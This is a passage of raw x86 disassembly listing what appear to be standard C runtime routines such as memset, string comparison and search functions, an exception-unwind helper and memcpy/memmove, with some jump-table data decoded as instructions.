  42628b:	mov    ecx,edx
  42628d:	and    edx,0x3
  426290:	shr    ecx,0x2
  426293:	je     0x42629b
  426295:	rep stos DWORD PTR es:[edi],eax
  426297:	test   edx,edx
  426299:	je     0x4262a5
  42629b:	mov    BYTE PTR [edi],al
  42629d:	add    edi,0x1
  4262a0:	sub    edx,0x1
  4262a3:	jne    0x42629b
  4262a5:	mov    eax,DWORD PTR [esp+0x8]
  4262a9:	pop    edi
  4262aa:	ret    
  4262ab:	mov    eax,DWORD PTR [esp+0x4]
  4262af:	ret    
  4262b0:	push   esi
  4262b1:	mov    esi,DWORD PTR [esp+0x8]
  4262b5:	test   esi,esi
  4262b7:	je     0x42643e
  4262bd:	push   DWORD PTR [esi+0x4]
  4262c0:	call   0x42455a
  4262c5:	push   DWORD PTR [esi+0x8]
  4262c8:	call   0x42455a
  4262cd:	push   DWORD PTR [esi+0xc]
  4262d0:	call   0x42455a
  4262d5:	push   DWORD PTR [esi+0x10]
  4262d8:	call   0x42455a
  4262dd:	push   DWORD PTR [esi+0x14]
  4262e0:	call   0x42455a
  4262e5:	push   DWORD PTR [esi+0x18]
  4262e8:	call   0x42455a
  4262ed:	push   DWORD PTR [esi]
  4262ef:	call   0x42455a
  4262f4:	push   DWORD PTR [esi+0x20]
  4262f7:	call   0x42455a
  4262fc:	push   DWORD PTR [esi+0x24]
  4262ff:	call   0x42455a
  426304:	push   DWORD PTR [esi+0x28]
  426307:	call   0x42455a
  42630c:	push   DWORD PTR [esi+0x2c]
  42630f:	call   0x42455a
  426314:	push   DWORD PTR [esi+0x30]
  426317:	call   0x42455a
  42631c:	push   DWORD PTR [esi+0x34]
  42631f:	call   0x42455a
  426324:	push   DWORD PTR [esi+0x1c]
  426327:	call   0x42455a
  42632c:	push   DWORD PTR [esi+0x38]
  42632f:	call   0x42455a
  426334:	push   DWORD PTR [esi+0x3c]
  426337:	call   0x42455a
  42633c:	add    esp,0x40
  42633f:	push   DWORD PTR [esi+0x40]
  426342:	call   0x42455a
  426347:	push   DWORD PTR [esi+0x44]
  42634a:	call   0x42455a
  42634f:	push   DWORD PTR [esi+0x48]
  426352:	call   0x42455a
  426357:	push   DWORD PTR [esi+0x4c]
  42635a:	call   0x42455a
  42635f:	push   DWORD PTR [esi+0x50]
  426362:	call   0x42455a
  426367:	push   DWORD PTR [esi+0x54]
  42636a:	call   0x42455a
  42636f:	push   DWORD PTR [esi+0x58]
  426372:	call   0x42455a
  426377:	push   DWORD PTR [esi+0x5c]
  42637a:	call   0x42455a
  42637f:	push   DWORD PTR [esi+0x60]
  426382:	call   0x42455a
  426387:	push   DWORD PTR [esi+0x64]
  42638a:	call   0x42455a
  42638f:	push   DWORD PTR [esi+0x68]
  426392:	call   0x42455a
  426397:	push   DWORD PTR [esi+0x6c]
  42639a:	call   0x42455a
  42639f:	push   DWORD PTR [esi+0x70]
  4263a2:	call   0x42455a
  4263a7:	push   DWORD PTR [esi+0x74]
  4263aa:	call   0x42455a
  4263af:	push   DWORD PTR [esi+0x78]
  4263b2:	call   0x42455a
  4263b7:	push   DWORD PTR [esi+0x7c]
  4263ba:	call   0x42455a
  4263bf:	add    esp,0x40
  4263c2:	push   DWORD PTR [esi+0x80]
  4263c8:	call   0x42455a
  4263cd:	push   DWORD PTR [esi+0x84]
  4263d3:	call   0x42455a
  4263d8:	push   DWORD PTR [esi+0x88]
  4263de:	call   0x42455a
  4263e3:	push   DWORD PTR [esi+0x8c]
  4263e9:	call   0x42455a
  4263ee:	push   DWORD PTR [esi+0x90]
  4263f4:	call   0x42455a
  4263f9:	push   DWORD PTR [esi+0x94]
  4263ff:	call   0x42455a
  426404:	push   DWORD PTR [esi+0x98]
  42640a:	call   0x42455a
  42640f:	push   DWORD PTR [esi+0x9c]
  426415:	call   0x42455a
  42641a:	push   DWORD PTR [esi+0xa0]
  426420:	call   0x42455a
  426425:	push   DWORD PTR [esi+0xa4]
  42642b:	call   0x42455a
  426430:	push   DWORD PTR [esi+0xa8]
  426436:	call   0x42455a
  42643b:	add    esp,0x2c
  42643e:	pop    esi
  42643f:	ret    
  426440:	push   esi
  426441:	mov    esi,DWORD PTR [esp+0x8]
  426445:	test   esi,esi
  426447:	je     0x42649d
  426449:	mov    eax,DWORD PTR [esi]
  42644b:	mov    ecx,DWORD PTR ds:0x464bc4
  426451:	cmp    eax,DWORD PTR [ecx]
  426453:	je     0x426464
  426455:	cmp    eax,DWORD PTR ds:0x464b94
  42645b:	je     0x426464
  42645d:	push   eax
  42645e:	call   0x42455a
  426463:	pop    ecx
  426464:	mov    eax,DWORD PTR [esi+0x4]
  426467:	mov    ecx,DWORD PTR ds:0x464bc4
  42646d:	cmp    eax,DWORD PTR [ecx+0x4]
  426470:	je     0x426481
  426472:	cmp    eax,DWORD PTR ds:0x464b98
  426478:	je     0x426481
  42647a:	push   eax
  42647b:	call   0x42455a
  426480:	pop    ecx
  426481:	mov    esi,DWORD PTR [esi+0x8]
  426484:	mov    eax,ds:0x464bc4
  426489:	cmp    esi,DWORD PTR [eax+0x8]
  42648c:	je     0x42649d
  42648e:	cmp    esi,DWORD PTR ds:0x464b9c
  426494:	je     0x42649d
  426496:	push   esi
  426497:	call   0x42455a
  42649c:	pop    ecx
  42649d:	pop    esi
  42649e:	ret    
  42649f:	push   esi
  4264a0:	mov    esi,DWORD PTR [esp+0x8]
  4264a4:	test   esi,esi
  4264a6:	je     0x426576
  4264ac:	mov    eax,DWORD PTR [esi+0xc]
  4264af:	mov    ecx,DWORD PTR ds:0x464bc4
  4264b5:	cmp    eax,DWORD PTR [ecx+0xc]
  4264b8:	je     0x4264c9
  4264ba:	cmp    eax,DWORD PTR ds:0x464ba0
  4264c0:	je     0x4264c9
  4264c2:	push   eax
  4264c3:	call   0x42455a
  4264c8:	pop    ecx
  4264c9:	mov    eax,DWORD PTR [esi+0x10]
  4264cc:	mov    ecx,DWORD PTR ds:0x464bc4
  4264d2:	cmp    eax,DWORD PTR [ecx+0x10]
  4264d5:	je     0x4264e6
  4264d7:	cmp    eax,DWORD PTR ds:0x464ba4
  4264dd:	je     0x4264e6
  4264df:	push   eax
  4264e0:	call   0x42455a
  4264e5:	pop    ecx
  4264e6:	mov    eax,DWORD PTR [esi+0x14]
  4264e9:	mov    ecx,DWORD PTR ds:0x464bc4
  4264ef:	cmp    eax,DWORD PTR [ecx+0x14]
  4264f2:	je     0x426503
  4264f4:	cmp    eax,DWORD PTR ds:0x464ba8
  4264fa:	je     0x426503
  4264fc:	push   eax
  4264fd:	call   0x42455a
  426502:	pop    ecx
  426503:	mov    eax,DWORD PTR [esi+0x18]
  426506:	mov    ecx,DWORD PTR ds:0x464bc4
  42650c:	cmp    eax,DWORD PTR [ecx+0x18]
  42650f:	je     0x426520
  426511:	cmp    eax,DWORD PTR ds:0x464bac
  426517:	je     0x426520
  426519:	push   eax
  42651a:	call   0x42455a
  42651f:	pop    ecx
  426520:	mov    eax,DWORD PTR [esi+0x1c]
  426523:	mov    ecx,DWORD PTR ds:0x464bc4
  426529:	cmp    eax,DWORD PTR [ecx+0x1c]
  42652c:	je     0x42653d
  42652e:	cmp    eax,DWORD PTR ds:0x464bb0
  426534:	je     0x42653d
  426536:	push   eax
  426537:	call   0x42455a
  42653c:	pop    ecx
  42653d:	mov    eax,DWORD PTR [esi+0x20]
  426540:	mov    ecx,DWORD PTR ds:0x464bc4
  426546:	cmp    eax,DWORD PTR [ecx+0x20]
  426549:	je     0x42655a
  42654b:	cmp    eax,DWORD PTR ds:0x464bb4
  426551:	je     0x42655a
  426553:	push   eax
  426554:	call   0x42455a
  426559:	pop    ecx
  42655a:	mov    esi,DWORD PTR [esi+0x24]
  42655d:	mov    eax,ds:0x464bc4
  426562:	cmp    esi,DWORD PTR [eax+0x24]
  426565:	je     0x426576
  426567:	cmp    esi,DWORD PTR ds:0x464bb8
  42656d:	je     0x426576
  42656f:	push   esi
  426570:	call   0x42455a
  426575:	pop    ecx
  426576:	pop    esi
  426577:	ret    
  426578:	int3   
  426579:	int3   
  42657a:	int3   
  42657b:	int3   
  42657c:	int3   
  42657d:	int3   
  42657e:	int3   
  42657f:	int3   
  426580:	push   ebp
  426581:	mov    ebp,esp
  426583:	push   esi
  426584:	xor    eax,eax
  426586:	push   eax
  426587:	push   eax
  426588:	push   eax
  426589:	push   eax
  42658a:	push   eax
  42658b:	push   eax
  42658c:	push   eax
  42658d:	push   eax
  42658e:	mov    edx,DWORD PTR [ebp+0xc]
  426591:	lea    ecx,[ecx+0x0]
  426594:	mov    al,BYTE PTR [edx]
  426596:	or     al,al
  426598:	je     0x4265a3
  42659a:	add    edx,0x1
  42659d:	bts    DWORD PTR [esp],eax
  4265a1:	jmp    0x426594
  4265a3:	mov    esi,DWORD PTR [ebp+0x8]
  4265a6:	or     ecx,0xffffffff
  4265a9:	lea    ecx,[ecx+0x0]
  4265ac:	add    ecx,0x1
  4265af:	mov    al,BYTE PTR [esi]
  4265b1:	or     al,al
  4265b3:	je     0x4265be
  4265b5:	add    esi,0x1
  4265b8:	bt     DWORD PTR [esp],eax
  4265bc:	jae    0x4265ac
  4265be:	mov    eax,ecx
  4265c0:	add    esp,0x20
  4265c3:	pop    esi
  4265c4:	leave  
  4265c5:	ret    
  4265c6:	int3   
  4265c7:	int3   
  4265c8:	int3   
  4265c9:	int3   
  4265ca:	int3   
  4265cb:	int3   
  4265cc:	int3   
  4265cd:	int3   
  4265ce:	int3   
  4265cf:	int3   
  4265d0:	mov    edx,DWORD PTR [esp+0x4]
  4265d4:	mov    ecx,DWORD PTR [esp+0x8]
  4265d8:	test   edx,0x3
  4265de:	jne    0x42661c
  4265e0:	mov    eax,DWORD PTR [edx]
  4265e2:	cmp    al,BYTE PTR [ecx]
  4265e4:	jne    0x426614
  4265e6:	or     al,al
  4265e8:	je     0x426610
  4265ea:	cmp    ah,BYTE PTR [ecx+0x1]
  4265ed:	jne    0x426614
  4265ef:	or     ah,ah
  4265f1:	je     0x426610
  4265f3:	shr    eax,0x10
  4265f6:	cmp    al,BYTE PTR [ecx+0x2]
  4265f9:	jne    0x426614
  4265fb:	or     al,al
  4265fd:	je     0x426610
  4265ff:	cmp    ah,BYTE PTR [ecx+0x3]
  426602:	jne    0x426614
  426604:	add    ecx,0x4
  426607:	add    edx,0x4
  42660a:	or     ah,ah
  42660c:	jne    0x4265e0
  42660e:	mov    edi,edi
  426610:	xor    eax,eax
  426612:	ret    
  426613:	nop
  426614:	sbb    eax,eax
  426616:	shl    eax,1
  426618:	add    eax,0x1
  42661b:	ret    
  42661c:	test   edx,0x1
  426622:	je     0x42663c
  426624:	mov    al,BYTE PTR [edx]
  426626:	add    edx,0x1
  426629:	cmp    al,BYTE PTR [ecx]
  42662b:	jne    0x426614
  42662d:	add    ecx,0x1
  426630:	or     al,al
  426632:	je     0x426610
  426634:	test   edx,0x2
  42663a:	je     0x4265e0
  42663c:	mov    ax,WORD PTR [edx]
  42663f:	add    edx,0x2
  426642:	cmp    al,BYTE PTR [ecx]
  426644:	jne    0x426614
  426646:	or     al,al
  426648:	je     0x426610
  42664a:	cmp    ah,BYTE PTR [ecx+0x1]
  42664d:	jne    0x426614
  42664f:	or     ah,ah
  426651:	je     0x426610
  426653:	add    ecx,0x2
  426656:	jmp    0x4265e0
  426658:	int3   
  426659:	int3   
  42665a:	int3   
  42665b:	int3   
  42665c:	int3   
  42665d:	int3   
  42665e:	int3   
  42665f:	int3   
  426660:	mov    eax,DWORD PTR [esp+0xc]
  426664:	test   eax,eax
  426666:	je     0x4266b2
  426668:	mov    edx,DWORD PTR [esp+0x4]
  42666c:	push   esi
  42666d:	push   edi
  42666e:	mov    esi,edx
  426670:	mov    edi,DWORD PTR [esp+0x10]
  426674:	or     edx,edi
  426676:	and    edx,0x3
  426679:	je     0x4266b3
  42667b:	test   eax,0x1
  426680:	je     0x426693
  426682:	mov    cl,BYTE PTR [esi]
  426684:	cmp    cl,BYTE PTR [edi]
  426686:	jne    0x4266e0
  426688:	add    esi,0x1
  42668b:	add    edi,0x1
  42668e:	sub    eax,0x1
  426691:	je     0x4266b0
  426693:	mov    cl,BYTE PTR [esi]
  426695:	mov    dl,BYTE PTR [edi]
  426697:	cmp    cl,dl
  426699:	jne    0x4266e0
  42669b:	mov    cl,BYTE PTR [esi+0x1]
  42669e:	mov    dl,BYTE PTR [edi+0x1]
  4266a1:	cmp    cl,dl
  4266a3:	jne    0x4266e0
  4266a5:	add    edi,0x2
  4266a8:	add    esi,0x2
  4266ab:	sub    eax,0x2
  4266ae:	jne    0x426693
  4266b0:	pop    edi
  4266b1:	pop    esi
  4266b2:	ret    
  4266b3:	mov    ecx,eax
  4266b5:	and    eax,0x3
  4266b8:	shr    ecx,0x2
  4266bb:	je     0x4266e8
  4266bd:	repz cmps DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4266bf:	je     0x4266e8
  4266c1:	mov    ecx,DWORD PTR [esi-0x4]
  4266c4:	mov    edx,DWORD PTR [edi-0x4]
  4266c7:	cmp    cl,dl
  4266c9:	jne    0x4266db
  4266cb:	cmp    ch,dh
  4266cd:	jne    0x4266db
  4266cf:	shr    ecx,0x10
  4266d2:	shr    edx,0x10
  4266d5:	cmp    cl,dl
  4266d7:	jne    0x4266db
  4266d9:	cmp    ch,dh
  4266db:	mov    eax,0x0
  4266e0:	sbb    eax,eax
  4266e2:	pop    edi
  4266e3:	sbb    eax,0xffffffff
  4266e6:	pop    esi
  4266e7:	ret    
  4266e8:	test   eax,eax
  4266ea:	je     0x4266b0
  4266ec:	mov    edx,DWORD PTR [esi]
  4266ee:	mov    ecx,DWORD PTR [edi]
  4266f0:	cmp    dl,cl
  4266f2:	jne    0x4266db
  4266f4:	sub    eax,0x1
  4266f7:	je     0x426715
  4266f9:	cmp    dh,ch
  4266fb:	jne    0x4266db
  4266fd:	sub    eax,0x1
  426700:	je     0x426715
  426702:	and    ecx,0xff0000
  426708:	and    edx,0xff0000
  42670e:	cmp    edx,ecx
  426710:	jne    0x4266db
  426712:	sub    eax,0x1
  426715:	pop    edi
  426716:	pop    esi
  426717:	ret    
  426718:	int3   
  426719:	int3   
  42671a:	int3   
  42671b:	int3   
  42671c:	int3   
  42671d:	int3   
  42671e:	int3   
  42671f:	int3   
  426720:	push   ebp
  426721:	mov    ebp,esp
  426723:	push   edi
  426724:	push   esi
  426725:	push   ebx
  426726:	mov    ecx,DWORD PTR [ebp+0x10]
  426729:	jecxz  0x426752
  42672b:	mov    ebx,ecx
  42672d:	mov    edi,DWORD PTR [ebp+0x8]
  426730:	mov    esi,edi
  426732:	xor    eax,eax
  426734:	repnz scas al,BYTE PTR es:[edi]
  426736:	neg    ecx
  426738:	add    ecx,ebx
  42673a:	mov    edi,esi
  42673c:	mov    esi,DWORD PTR [ebp+0xc]
  42673f:	repz cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426741:	mov    al,BYTE PTR [esi-0x1]
  426744:	xor    ecx,ecx
  426746:	cmp    al,BYTE PTR [edi-0x1]
  426749:	ja     0x426750
  42674b:	je     0x426752
  42674d:	sub    ecx,0x2
  426750:	not    ecx
  426752:	mov    eax,ecx
  426754:	pop    ebx
  426755:	pop    esi
  426756:	pop    edi
  426757:	leave  
  426758:	ret    
  426759:	int3   
  42675a:	int3   
  42675b:	int3   
  42675c:	int3   
  42675d:	int3   
  42675e:	int3   
  42675f:	int3   
  426760:	push   ebp
  426761:	mov    ebp,esp
  426763:	push   esi
  426764:	xor    eax,eax
  426766:	push   eax
  426767:	push   eax
  426768:	push   eax
  426769:	push   eax
  42676a:	push   eax
  42676b:	push   eax
  42676c:	push   eax
  42676d:	push   eax
  42676e:	mov    edx,DWORD PTR [ebp+0xc]
  426771:	lea    ecx,[ecx+0x0]
  426774:	mov    al,BYTE PTR [edx]
  426776:	or     al,al
  426778:	je     0x426783
  42677a:	add    edx,0x1
  42677d:	bts    DWORD PTR [esp],eax
  426781:	jmp    0x426774
  426783:	mov    esi,DWORD PTR [ebp+0x8]
  426786:	mov    edi,edi
  426788:	mov    al,BYTE PTR [esi]
  42678a:	or     al,al
  42678c:	je     0x42679a
  42678e:	add    esi,0x1
  426791:	bt     DWORD PTR [esp],eax
  426795:	jae    0x426788
  426797:	lea    eax,[esi-0x1]
  42679a:	add    esp,0x20
  42679d:	pop    esi
  42679e:	leave  
  42679f:	ret    
  4267a0:	push   ebp
  4267a1:	mov    ebp,esp
  4267a3:	push   ebx
  4267a4:	push   esi
  4267a5:	push   edi
  4267a6:	push   ebp
  4267a7:	push   0x0
  4267a9:	push   0x0
  4267ab:	push   0x4267b8
  4267b0:	push   DWORD PTR [ebp+0x8]
  4267b3:	call   0x42722e
  4267b8:	pop    ebp
  4267b9:	pop    edi
  4267ba:	pop    esi
  4267bb:	pop    ebx
  4267bc:	mov    esp,ebp
  4267be:	pop    ebp
  4267bf:	ret    
  4267c0:	mov    ecx,DWORD PTR [esp+0x4]
  4267c4:	test   DWORD PTR [ecx+0x4],0x6
  4267cb:	mov    eax,0x1
  4267d0:	je     0x4267e1
  4267d2:	mov    eax,DWORD PTR [esp+0x8]
  4267d6:	mov    edx,DWORD PTR [esp+0x10]
  4267da:	mov    DWORD PTR [edx],eax
  4267dc:	mov    eax,0x3
  4267e1:	ret    
  4267e2:	push   ebx
  4267e3:	push   esi
  4267e4:	push   edi
  4267e5:	mov    eax,DWORD PTR [esp+0x10]
  4267e9:	push   eax
  4267ea:	push   0xfffffffe
  4267ec:	push   0x4267c0
  4267f1:	push   DWORD PTR fs:0x0
  4267f8:	mov    DWORD PTR fs:0x0,esp
  4267ff:	mov    eax,DWORD PTR [esp+0x20]
  426803:	mov    ebx,DWORD PTR [eax+0x8]
  426806:	mov    esi,DWORD PTR [eax+0xc]
  426809:	cmp    esi,0xffffffff
  42680c:	je     0x42683c
  42680e:	cmp    esi,DWORD PTR [esp+0x24]
  426812:	je     0x42683c
  426814:	lea    esi,[esi+esi*2]
  426817:	mov    ecx,DWORD PTR [ebx+esi*4]
  42681a:	mov    DWORD PTR [esp+0x8],ecx
  42681e:	mov    DWORD PTR [eax+0xc],ecx
  426821:	cmp    DWORD PTR [ebx+esi*4+0x4],0x0
  426826:	jne    0x42683a
  426828:	push   0x101
  42682d:	mov    eax,DWORD PTR [ebx+esi*4+0x8]
  426831:	call   0x426876
  426836:	call   DWORD PTR [ebx+esi*4+0x8]
  42683a:	jmp    0x4267ff
  42683c:	pop    DWORD PTR fs:0x0
  426843:	add    esp,0xc
  426846:	pop    edi
  426847:	pop    esi
  426848:	pop    ebx
  426849:	ret    
  42684a:	xor    eax,eax
  42684c:	mov    ecx,DWORD PTR fs:0x0
  426853:	cmp    DWORD PTR [ecx+0x4],0x4267c0
  42685a:	jne    0x42686c
  42685c:	mov    edx,DWORD PTR [ecx+0xc]
  42685f:	mov    edx,DWORD PTR [edx+0xc]
  426862:	cmp    DWORD PTR [ecx+0x8],edx
  426865:	jne    0x42686c
  426867:	mov    eax,0x1
  42686c:	ret    
  42686d:	push   ebx
  42686e:	push   ecx
  42686f:	mov    ebx,0x464bdc
  426874:	jmp    0x426880
  426876:	push   ebx
  426877:	push   ecx
  426878:	mov    ebx,0x464bdc
  42687d:	mov    ecx,DWORD PTR [ebp+0x8]
  426880:	mov    DWORD PTR [ebx+0x8],ecx
  426883:	mov    DWORD PTR [ebx+0x4],eax
  426886:	mov    DWORD PTR [ebx+0xc],ebp
  426889:	pop    ecx
  42688a:	pop    ebx
  42688b:	ret    0x4
  42688e:	int3   
  42688f:	int3   
  426890:	push   ebp
  426891:	mov    ebp,esp
  426893:	push   edi
  426894:	push   esi
  426895:	mov    esi,DWORD PTR [ebp+0xc]
  426898:	mov    ecx,DWORD PTR [ebp+0x10]
  42689b:	mov    edi,DWORD PTR [ebp+0x8]
  42689e:	mov    eax,ecx
  4268a0:	mov    edx,ecx
  4268a2:	add    eax,esi
  4268a4:	cmp    edi,esi
  4268a6:	jbe    0x4268b0
  4268a8:	cmp    edi,eax
  4268aa:	jb     0x426a2c
  4268b0:	test   edi,0x3
  4268b6:	jne    0x4268cc
  4268b8:	shr    ecx,0x2
  4268bb:	and    edx,0x3
  4268be:	cmp    ecx,0x8
  4268c1:	jb     0x4268ec
  4268c3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4268c5:	jmp    DWORD PTR [edx*4+0x4269dc]
  4268cc:	mov    eax,edi
  4268ce:	mov    edx,0x3
  4268d3:	sub    ecx,0x4
  4268d6:	jb     0x4268e4
  4268d8:	and    eax,0x3
  4268db:	add    ecx,eax
  4268dd:	jmp    DWORD PTR [eax*4+0x4268f0]
  4268e4:	jmp    DWORD PTR [ecx*4+0x4269ec]
  4268eb:	nop
  4268ec:	jmp    DWORD PTR [ecx*4+0x426970]
  4268f3:	nop
  4268f4:	add    BYTE PTR [ecx+0x42],ch
  4268f7:	add    BYTE PTR [ecx+ebp*2],ch
  4268fa:	inc    edx
  4268fb:	add    BYTE PTR [eax+0x69],dl
  4268fe:	inc    edx
  4268ff:	add    BYTE PTR [ebx],ah
  426901:	ror    DWORD PTR [edx-0x75f877fa],1
  426907:	inc    esi
  426908:	add    DWORD PTR [eax+0x468a0147],ecx
  42690e:	add    al,cl
  426910:	jmp    0x289f117
  426915:	add    esi,0x3
  426918:	add    edi,0x3
  42691b:	cmp    ecx,0x8
  42691e:	jb     0x4268ec
  426920:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426922:	jmp    DWORD PTR [edx*4+0x4269dc]
  426929:	lea    ecx,[ecx+0x0]
  42692c:	and    edx,ecx
  42692e:	mov    al,BYTE PTR [esi]
  426930:	mov    BYTE PTR [edi],al
  426932:	mov    al,BYTE PTR [esi+0x1]
  426935:	shr    ecx,0x2
  426938:	mov    BYTE PTR [edi+0x1],al
  42693b:	add    esi,0x2
  42693e:	add    edi,0x2
  426941:	cmp    ecx,0x8
  426944:	jb     0x4268ec
  426946:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426948:	jmp    DWORD PTR [edx*4+0x4269dc]
  42694f:	nop
  426950:	and    edx,ecx
  426952:	mov    al,BYTE PTR [esi]
  426954:	mov    BYTE PTR [edi],al
  426956:	add    esi,0x1
  426959:	shr    ecx,0x2
  42695c:	add    edi,0x1
  42695f:	cmp    ecx,0x8
  426962:	jb     0x4268ec
  426964:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426966:	jmp    DWORD PTR [edx*4+0x4269dc]
  42696d:	lea    ecx,[ecx+0x0]
  426970:	shr    DWORD PTR [ecx+0x42],cl
  426973:	add    al,al
  426975:	imul   eax,DWORD PTR [edx+0x0],0x4269b8
  42697c:	mov    al,0x69
  42697e:	inc    edx
  42697f:	add    BYTE PTR [eax-0x5fffbd97],ch
  426985:	imul   eax,DWORD PTR [edx+0x0],0x426998
  42698c:	nop
  42698d:	imul   eax,DWORD PTR [edx+0x0],0xe48e448b
  426994:	mov    DWORD PTR [edi+ecx*4-0x1c],eax
  426998:	mov    eax,DWORD PTR [esi+ecx*4-0x18]
  42699c:	mov    DWORD PTR [edi+ecx*4-0x18],eax
  4269a0:	mov    eax,DWORD PTR [esi+ecx*4-0x14]
  4269a4:	mov    DWORD PTR [edi+ecx*4-0x14],eax
  4269a8:	mov    eax,DWORD PTR [esi+ecx*4-0x10]
  4269ac:	mov    DWORD PTR [edi+ecx*4-0x10],eax
  4269b0:	mov    eax,DWORD PTR [esi+ecx*4-0xc]
  4269b4:	mov    DWORD PTR [edi+ecx*4-0xc],eax
  4269b8:	mov    eax,DWORD PTR [esi+ecx*4-0x8]
  4269bc:	mov    DWORD PTR [edi+ecx*4-0x8],eax
  4269c0:	mov    eax,DWORD PTR [esi+ecx*4-0x4]
  4269c4:	mov    DWORD PTR [edi+ecx*4-0x4],eax
  4269c8:	lea    eax,[ecx*4+0x0]
  4269cf:	add    esi,eax
  4269d1:	add    edi,eax
  4269d3:	jmp    DWORD PTR [edx*4+0x4269dc]
  4269da:	mov    edi,edi
  4269dc:	in     al,dx
  4269dd:	imul   eax,DWORD PTR [edx+0x0],0x4269f4
  4269e4:	add    BYTE PTR [edx+0x42],ch
  4269e7:	add    BYTE PTR [edx+ebp*2],dl
  4269ea:	inc    edx
  4269eb:	add    BYTE PTR [ebx+0x5f5e0845],cl
  4269f1:	leave  
  4269f2:	ret    
  4269f3:	nop
  4269f4:	mov    al,BYTE PTR [esi]
  4269f6:	mov    BYTE PTR [edi],al
  4269f8:	mov    eax,DWORD PTR [ebp+0x8]
  4269fb:	pop    esi
  4269fc:	pop    edi
  4269fd:	leave  
  4269fe:	ret    
  4269ff:	nop
  426a00:	mov    al,BYTE PTR [esi]
  426a02:	mov    BYTE PTR [edi],al
  426a04:	mov    al,BYTE PTR [esi+0x1]
  426a07:	mov    BYTE PTR [edi+0x1],al
  426a0a:	mov    eax,DWORD PTR [ebp+0x8]
  426a0d:	pop    esi
  426a0e:	pop    edi
  426a0f:	leave  
  426a10:	ret    
  426a11:	lea    ecx,[ecx+0x0]
  426a14:	mov    al,BYTE PTR [esi]
  426a16:	mov    BYTE PTR [edi],al
  426a18:	mov    al,BYTE PTR [esi+0x1]
  426a1b:	mov    BYTE PTR [edi+0x1],al
  426a1e:	mov    al,BYTE PTR [esi+0x2]
  426a21:	mov    BYTE PTR [edi+0x2],al
  426a24:	mov    eax,DWORD PTR [ebp+0x8]
  426a27:	pop    esi
  426a28:	pop    edi
  426a29:	leave  
  426a2a:	ret    
  426a2b:	nop
  426a2c:	lea    esi,[ecx+esi*1-0x4]
  426a30:	lea    edi,[ecx+edi*1-0x4]
  426a34:	test   edi,0x3
  426a3a:	jne    0x426a60
  426a3c:	shr    ecx,0x2
  426a3f:	and    edx,0x3
  426a42:	cmp    ecx,0x8
  426a45:	jb     0x426a54
  426a47:	std    
  426a48:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426a4a:	cld    
  426a4b:	jmp    DWORD PTR [edx*4+0x426b78]
  426a52:	mov    edi,edi
  426a54:	neg    ecx
  426a56:	jmp    DWORD PTR [ecx*4+0x426b28]
  426a5d:	lea    ecx,[ecx+0x0]
  426a60:	mov    eax,edi
  426a62:	mov    edx,0x3
  426a67:	cmp    ecx,0x4
  426a6a:	jb     0x426a78
  426a6c:	and    eax,0x3
  426a6f:	sub    ecx,eax
  426a71:	jmp    DWORD PTR [eax*4+0x426a7c]
  426a78:	jmp    DWORD PTR [ecx*4+0x426b78]
  426a7f:	nop
  426a80:	mov    WORD PTR [edx+0x42],gs
  426a83:	add    BYTE PTR [eax-0x27ffbd96],dh
  426a89:	push   0x42
  426a8b:	add    BYTE PTR [edx-0x2edcfcba],cl
  426a91:	mov    BYTE PTR [edi+0x3],al
  426a94:	sub    esi,0x1
  426a97:	shr    ecx,0x2
  426a9a:	sub    edi,0x1
  426a9d:	cmp    ecx,0x8
  426aa0:	jb     0x426a54
  426aa2:	std    
  426aa3:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426aa5:	cld    
  426aa6:	jmp    DWORD PTR [edx*4+0x426b78]
  426aad:	lea    ecx,[ecx+0x0]
  426ab0:	mov    al,BYTE PTR [esi+0x3]
  426ab3:	and    edx,ecx
  426ab5:	mov    BYTE PTR [edi+0x3],al
  426ab8:	mov    al,BYTE PTR [esi+0x2]
  426abb:	shr    ecx,0x2
  426abe:	mov    BYTE PTR [edi+0x2],al
  426ac1:	sub    esi,0x2
  426ac4:	sub    edi,0x2
  426ac7:	cmp    ecx,0x8
  426aca:	jb     0x426a54
  426acc:	std    
  426acd:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426acf:	cld    
  426ad0:	jmp    DWORD PTR [edx*4+0x426b78]
  426ad7:	nop
  426ad8:	mov    al,BYTE PTR [esi+0x3]
  426adb:	and    edx,ecx
  426add:	mov    BYTE PTR [edi+0x3],al
  426ae0:	mov    al,BYTE PTR [esi+0x2]
  426ae3:	mov    BYTE PTR [edi+0x2],al
  426ae6:	mov    al,BYTE PTR [esi+0x1]
  426ae9:	shr    ecx,0x2
  426aec:	mov    BYTE PTR [edi+0x1],al
  426aef:	sub    esi,0x3
  426af2:	sub    edi,0x3
  426af5:	cmp    ecx,0x8
  426af8:	jb     0x426a54
  426afe:	std    
  426aff:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  426b01:	cld    
  426b02:	jmp    DWORD PTR [edx*4+0x426b78]
  426b09:	lea    ecx,[ecx+0x0]
  426b0c:	sub    al,0x6b
  426b0e:	inc    edx
  426b0f:	add    BYTE PTR [ebx+ebp*2],dh
  426b12:	inc    edx
  426b13:	add    BYTE PTR [ebx+ebp*2],bh
  426b16:	inc    edx
  426b17:	add    BYTE PTR [ebx+ebp*2+0x42],al
  426b1b:	add    BYTE PTR [ebx+ebp*2+0x42],cl
  426b1f:	add    BYTE PTR [ebx+ebp*2+0x42],dl
  426b23:	add    BYTE PTR [ebx+ebp*2+0x42],bl
  426b27:	add    BYTE PTR [edi+0x6b],ch
  426b2a:	inc    edx
  426b2b:	add    BYTE PTR [ebx-0x76e371bc],cl
  426b31:	inc    esp
  426b32:	(bad)  
  426b33:	sbb    al,0x8b
  426b35:	inc    esp
  426b36:	mov    ds,WORD PTR [eax]
  426b38:	mov    DWORD PTR [edi+ecx*4+0x18],eax
  426b3c:	mov    eax,DWORD PTR [esi+ecx*4+0x14]
  426b40:	mov    DWORD PTR [edi+ecx*4+0x14],eax
  426b44:	mov    eax,DWORD PTR [esi+ecx*4+0x10]
  426b48:	mov    DWORD PTR [edi+ecx*4+0x10],eax
  426b4c:	mov    eax,DWORD PTR [esi+ecx*4+0xc]
  426b50:	mov    DWORD PTR [edi+ecx*4+0xc],eax
